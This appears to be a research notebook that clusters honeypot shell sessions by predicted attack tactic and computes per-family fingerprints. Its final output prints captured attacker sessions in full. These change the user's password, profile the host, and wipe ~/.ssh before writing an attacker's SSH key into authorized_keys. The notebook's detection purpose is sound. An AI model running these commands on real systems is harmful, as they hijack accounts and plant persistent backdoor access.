{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "776353ce-ac75-4ee2-86a6-7b2bb2faf02f",
   "metadata": {},
   "source": [
    "# This notebook creates \"prototypes\", i.e. among the \"families\" of attacks, we'll try to figure:\n",
    "- what is common > kind of finding the attack's signature\n",
    "- what changes > and kind of characterize the attack"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8678c5e3-00bd-4625-bc8d-87c8b5d356ff",
   "metadata": {},
   "source": [
    "### Import dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "6826285b-f735-4b1f-959a-fe28e6f14301",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>session_id</th>\n",
       "      <th>full_session</th>\n",
       "      <th>source_ips</th>\n",
       "      <th>first_timestamp</th>\n",
       "      <th>Predicted_classes</th>\n",
       "      <th>Models_predictions</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0</td>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>213.6.160.50</td>\n",
       "      <td>2021-03-06 00:01:13</td>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>213.94.56.23</td>\n",
       "      <td>2021-03-06 00:02:55</td>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   session_id                                       full_session  \\\n",
       "0           0  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "1           1  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "\n",
       "     source_ips      first_timestamp  \\\n",
       "0  213.6.160.50  2021-03-06 00:01:13   \n",
       "1  213.94.56.23  2021-03-06 00:02:55   \n",
       "\n",
       "                                   Predicted_classes  \\\n",
       "0  Discovery -- Discovery -- Discovery -- Discove...   \n",
       "1  Discovery -- Discovery -- Discovery -- Discove...   \n",
       "\n",
       "                                  Models_predictions  \n",
       "0  Discovery -- Discovery -- Discovery -- Discove...  \n",
       "1  Discovery -- Discovery -- Discovery -- Discove...  "
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import pandas as pd \n",
    "PATH = \"../Dataset_preparation_and_inference/Datasets/POLITO\"\n",
    "predicted_corpus = pd.read_csv(f\"{PATH}/corpus_with_predictions.csv\")\n",
    "predicted_corpus.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "696f00d0-2283-4a76-bb50-817df8bf65e0",
   "metadata": {},
   "source": [
    "#### Filter \"/system scheduler\" sessions --> not bash"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "8a7bd82e-4707-43fb-996c-155ba59a6846",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Before filtering '/system scheduler' sessions: 160475\n",
      "After filtering '/system scheduler' sessions: 156545\n"
     ]
    }
   ],
   "source": [
    "print(f\"Before filtering '/system scheduler' sessions: {predicted_corpus.shape[0]}\")\n",
    "predicted_corpus = predicted_corpus[~predicted_corpus.full_session.str.contains(\"/system scheduler\")]\n",
    "print(f\"After filtering '/system scheduler' sessions: {predicted_corpus.shape[0]}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1641476e-105a-49a4-8bfc-6197a3c1f2e4",
   "metadata": {},
   "source": [
    "### How many unique sequences of predicted classes (considering \"Prefer not to say\")?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "2e30a6ee-a23f-4088-809e-475cfa75a263",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Number of unique predictions: 1858\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Predicted_classes</th>\n",
       "      <th>Counter</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>50696</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>32398</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                   Predicted_classes  Counter\n",
       "0  Discovery -- Discovery -- Discovery -- Discove...    50696\n",
       "1  Discovery -- Discovery -- Discovery -- Discove...    32398"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "counter_full_predictions = predicted_corpus.value_counts(\"Predicted_classes\").reset_index().rename({0:\"Counter\"}, axis = 1)\n",
    "print(f\"Number of unique predictions: {counter_full_predictions.shape[0]}\")\n",
    "counter_full_predictions.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "793fa4a3-8b46-4157-b0b6-f98b8ee19f2f",
   "metadata": {},
   "source": [
    "### How are they distributed?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "b5d260cf-7af4-455f-9aee-55b14566c8ff",
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "counter_full_predictions = counter_full_predictions.sort_values(by = [\"Counter\"])\n",
    "cdf_full_predictions = counter_full_predictions.value_counts(\"Counter\").sort_index()\n",
    "cdf_full_predictions = np.cumsum(cdf_full_predictions)/np.sum(cdf_full_predictions)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "07bc4b93-8dbc-46e2-a5c1-a220845188f5",
   "metadata": {},
   "source": [
    "### And what if we consider the model's predictions?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "7ba1e5f6-df36-426c-abec-707d0db08293",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Number of unique model's predictions: 1256\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Models_predictions</th>\n",
       "      <th>Counter</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>50705</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>26527</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                  Models_predictions  Counter\n",
       "0  Discovery -- Discovery -- Discovery -- Discove...    50705\n",
       "1  Discovery -- Discovery -- Discovery -- Discove...    26527"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "counter_model_predictions = predicted_corpus.value_counts(\"Models_predictions\").reset_index().rename({0:\"Counter\"}, axis = 1)\n",
    "print(f\"Number of unique model's predictions: {counter_model_predictions.shape[0]}\")\n",
    "counter_model_predictions.head(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "713cab4a-0bdf-4599-ad1e-c8fc99a7036b",
   "metadata": {},
   "outputs": [],
   "source": [
    "counter_model_predictions = counter_model_predictions.sort_values(by = [\"Counter\"])\n",
    "cdf_models_predictions = counter_model_predictions.value_counts(\"Counter\").sort_index()\n",
    "cdf_models_predictions = np.cumsum(cdf_models_predictions)/np.sum(cdf_models_predictions)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "662c41d8-cd95-474e-9db7-ac9e29bc9bde",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 700x400 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pyplot as plt \n",
    "\n",
    "fig, axs = plt.subplots(1, figsize=(7,4))\n",
    "fontsize = 20\n",
    "#axs.plot(cdf_full_predictions.reset_index()[\"Counter\"], cdf_full_predictions.reset_index()[0], linewidth = 2, label = \"PreferNot2Say\")\n",
    "#axs.scatter(cdf_full_predictions.reset_index()[\"Counter\"], cdf_full_predictions.reset_index()[0], c = \"k\", s = 20)\n",
    "axs.plot(cdf_models_predictions.reset_index()[\"Counter\"], cdf_models_predictions.reset_index()[0], linewidth = 2, label = \"ModelsPredictions\")\n",
    "#axs.scatter(cdf_no_rep_predictions.reset_index()[\"Counter\"], cdf_no_rep_predictions.reset_index()[0], c = \"k\", s = 20)\n",
    "axs.set_xlabel('|associated sessions| per prediction', fontsize = fontsize + 3)\n",
    "axs.set_xscale(\"log\")\n",
    "axs.set_title(f'ECDF of |associated sessions|\\nper prediction', fontsize = fontsize + 5)\n",
    "axs.set_ylabel('ECDF', fontsize = fontsize)\n",
    "axs.yaxis.set_tick_params(labelsize=fontsize)\n",
    "axs.xaxis.set_tick_params(labelsize=fontsize)\n",
    "axs.legend(fontsize=fontsize - 4)\n",
    "axs.grid()\n",
    "#axs.set_ylim(0,1.05)\n",
    "plt.tight_layout()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "18141c29-660a-443c-9929-5531111b9184",
   "metadata": {},
   "source": [
    "#### For each family, get mask of words\n",
    "##### Remember that within the same family we work on \"fixed size\" (each family of prediction has the same number of words)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "41105200-de8d-4e45-93d0-5b4b5f751375",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 1256/1256 [00:29<00:00, 42.69it/s]\n"
     ]
    }
   ],
   "source": [
    "from tqdm import tqdm\n",
    "families_attacks = predicted_corpus.Models_predictions.unique() # Obtain set of \"families\"\n",
    "df_prototypes = []\n",
    "for family in tqdm(families_attacks):\n",
    "    # Select the corresponding sessions\n",
    "    family_attacks = predicted_corpus[predicted_corpus.Models_predictions == family][[\"full_session\"]] \n",
    "    \n",
    "    splitted_sessions = family_attacks[\"full_session\"].str.split(' ', expand=True)\n",
    "    assert not splitted_sessions.isnull().values.any(), \"Error, NaN in the dataset\"\n",
    "    # Also save the number of associated sessions per family\n",
    "    associated_sessions = family_attacks.shape[0]\n",
    "    # Count the number of unique elements per column (each column corresponds to a word)\n",
    "    prototype = splitted_sessions.nunique().to_frame().T.values\n",
    "    prototype = np.divide(prototype, associated_sessions / 100)\n",
    "    # Save how many variable elements there are per family\n",
    "    varying_elements = len(prototype[(prototype != 1)])\n",
    "    percentage_varying_elements = varying_elements / prototype.shape[1] * 100\n",
    "\n",
    "    df_prototypes.append([family, associated_sessions, percentage_varying_elements, prototype])\n",
    "\n",
    "df_prototypes = pd.DataFrame(df_prototypes, columns = [\"Models_predictions\", \"associated_sessions\", \"percentage_varying_elements\", \"prototype\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "81afdabc-5c8e-48ce-b046-df704fd4b059",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Models_predictions</th>\n",
       "      <th>associated_sessions</th>\n",
       "      <th>percentage_varying_elements</th>\n",
       "      <th>prototype</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>8685</td>\n",
       "      <td>100.0</td>\n",
       "      <td>[[0.011514104778353483, 0.011514104778353483, ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>1543</td>\n",
       "      <td>100.0</td>\n",
       "      <td>[[0.06480881399870382, 0.06480881399870382, 0....</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                  Models_predictions  associated_sessions  \\\n",
       "0  Discovery -- Discovery -- Discovery -- Discove...                 8685   \n",
       "1  Discovery -- Discovery -- Discovery -- Discove...                 1543   \n",
       "\n",
       "   percentage_varying_elements  \\\n",
       "0                        100.0   \n",
       "1                        100.0   \n",
       "\n",
       "                                           prototype  \n",
       "0  [[0.011514104778353483, 0.011514104778353483, ...  \n",
       "1  [[0.06480881399870382, 0.06480881399870382, 0....  "
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_prototypes.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2d265e35-b17d-45d4-80c4-866e0b235210",
   "metadata": {},
   "source": [
    "#### Some generic stats"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "fc36b120-428a-49e2-8c3c-4dd55c0f7027",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Selected 151 fingerprints out of 1256\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>prototype</th>\n",
       "      <th>is_deterministic</th>\n",
       "      <th>contains_random</th>\n",
       "      <th>contains_semirandom</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>[0.011514104778353483, 0.011514104778353483, 0...</td>\n",
       "      <td>False</td>\n",
       "      <td>True</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>[0.06480881399870382, 0.06480881399870382, 0.0...</td>\n",
       "      <td>False</td>\n",
       "      <td>True</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                           prototype  is_deterministic  \\\n",
       "0  [0.011514104778353483, 0.011514104778353483, 0...             False   \n",
       "1  [0.06480881399870382, 0.06480881399870382, 0.0...             False   \n",
       "\n",
       "   contains_random  contains_semirandom  \n",
       "0             True                False  \n",
       "1             True                False  "
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "prototypes = df_prototypes[df_prototypes.associated_sessions > 10][[\"prototype\"]]\n",
    "print(f\"Selected {prototypes.shape[0]} fingerprints out of {df_prototypes.shape[0]}\")\n",
    "prototypes[\"prototype\"] = prototypes[\"prototype\"].apply(lambda el: el[0])\n",
    "def is_deterministic(list_prototype):\n",
    "    for el in list_prototype:\n",
    "        if el != 0:\n",
    "            return False\n",
    "    return True\n",
    "prototypes[\"is_deterministic\"] = prototypes[\"prototype\"].apply(lambda el: is_deterministic(el))\n",
    "def contains_random(list_prototype):\n",
    "    for el in list_prototype:\n",
    "        if el == 100:\n",
    "            return True\n",
    "    return False\n",
    "prototypes[\"contains_random\"] = prototypes[\"prototype\"].apply(lambda el: contains_random(el))\n",
    "def contains_semi_random(list_prototype):\n",
    "    for el in list_prototype:\n",
    "        if el > 5 and el != 100:\n",
    "            return True\n",
    "    return False\n",
    "prototypes[\"contains_semirandom\"] = prototypes[\"prototype\"].apply(lambda el: contains_semi_random(el))\n",
    "prototypes.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8d401c61-3bf3-4b80-9054-1c342bcdcfb0",
   "metadata": {},
   "source": [
    "##### Completely deterministic"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "987920cd-91b5-4432-9356-a353e4c8ad89",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False    151\n",
       "Name: is_deterministic, dtype: int64"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "prototypes.is_deterministic.value_counts()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f87f024e-4f70-465a-a8c9-a2f509963cce",
   "metadata": {},
   "source": [
    "##### Contains random"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "b70a5e26-d397-4662-b2fe-4dfcc2ac720a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True     131\n",
       "False     20\n",
       "Name: contains_random, dtype: int64"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "prototypes.contains_random.value_counts()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b2e6fdfa-c441-452c-8b03-ae07ee72bbd7",
   "metadata": {},
   "source": [
    "##### Contains semirandom"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "6c0b02a9-27d7-4e48-8b40-9343b1b398bf",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False    80\n",
       "True     71\n",
       "Name: contains_semirandom, dtype: int64"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "prototypes.contains_semirandom.value_counts()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fb1a47ff-fdf3-47b3-b01f-d96835bb90e9",
   "metadata": {},
   "source": [
    "## Now, let's investigate the one associated with more sessions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "d84efbb6-601c-4008-96dd-51705e1422c4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "N.b. First of the following:\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Models_predictions</th>\n",
       "      <th>associated_sessions</th>\n",
       "      <th>percentage_varying_elements</th>\n",
       "      <th>prototype</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>185</th>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>50705</td>\n",
       "      <td>100.0</td>\n",
       "      <td>[[0.0019721920915097132, 0.0019721920915097132...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>179</th>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>26527</td>\n",
       "      <td>100.0</td>\n",
       "      <td>[[0.003769744034380066, 0.003769744034380066, ...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                    Models_predictions  associated_sessions  \\\n",
       "185  Discovery -- Discovery -- Discovery -- Discove...                50705   \n",
       "179  Discovery -- Discovery -- Discovery -- Discove...                26527   \n",
       "\n",
       "     percentage_varying_elements  \\\n",
       "185                        100.0   \n",
       "179                        100.0   \n",
       "\n",
       "                                             prototype  \n",
       "185  [[0.0019721920915097132, 0.0019721920915097132...  \n",
       "179  [[0.003769744034380066, 0.003769744034380066, ...  "
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_prototypes.sort_values(by = \"associated_sessions\", ascending = False, inplace = True)\n",
    "print(\"N.b. First of the following:\")\n",
    "df_prototypes.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4804f4fb-185e-47a0-920f-7c14e4266deb",
   "metadata": {},
   "source": [
    "#### Idea here is that, since working withing the same family, we have guarantees that all sessions associated to that family will have the same number of words\n",
    "##### If that is the case, we can then visualize which are the n-bit changing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "2292b9ef-8ff2-4da6-8a16-6078ce03678b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 500x400 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "to_plot = df_prototypes.iloc[1].prototype[0]\n",
    "\n",
    "fig, axs = plt.subplots(1, figsize=(5,4))\n",
    "fontsize = 20\n",
    "axs.bar(np.arange(to_plot.shape[0]), to_plot)\n",
    "#axs.scatter(cdf_full_predictions.reset_index()[\"Counter\"], cdf_full_predictions.reset_index()[0], c = \"k\", s = 20)\n",
    "#axs.scatter(cdf_no_rep_predictions.reset_index()[\"Counter\"], cdf_no_rep_predictions.reset_index()[0], c = \"k\", s = 20)\n",
    "\n",
    "axs.set_xlabel(\"Words' positions\", fontsize = fontsize - 5)\n",
    "axs.set_ylabel('Unique elements per position', fontsize = fontsize - 5)\n",
    "axs.set_title(f'Unique elements per posision\\nwrt selected family', fontsize = fontsize)\n",
    "axs.yaxis.set_tick_params(labelsize=fontsize)\n",
    "axs.xaxis.set_tick_params(labelsize=fontsize)\n",
    "axs.grid()\n",
    "#axs.set_ylim(0,1.05)\n",
    "plt.tight_layout()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "51414a58-d2d6-4747-94db-6175820e5a11",
   "metadata": {},
   "source": [
    "#### Examples belonging to that family: "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "a9cf080c-78a4-48f9-884c-2ccb2caac2fb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "For family: \n",
      "Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Harmless -- Harmless -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence\n",
      "\n",
      "\n",
      "cat /proc/cpuinfo | grep name | wc -l ; echo -e \"123456\\nSa2puN1djQSJ\\nSa2puN1djQSJ\" | passwd | bash ; Enter new UNIX password: ; echo \"123456\\nSa2puN1djQSJ\\nSa2puN1djQSJ\\n\" | passwd ; cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9 ; }' ; free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' ; ls -lh $(which ls) ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ;\n",
      "\n",
      "cat /proc/cpuinfo | grep name | wc -l ; echo -e \"marilia\\noVIJt7nM5lyv\\noVIJt7nM5lyv\" | passwd | bash ; Enter new UNIX password: ; echo \"marilia\\noVIJt7nM5lyv\\noVIJt7nM5lyv\\n\" | passwd ; cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9 ; }' ; free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' ; ls -lh $(which ls) ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ;\n",
      "\n",
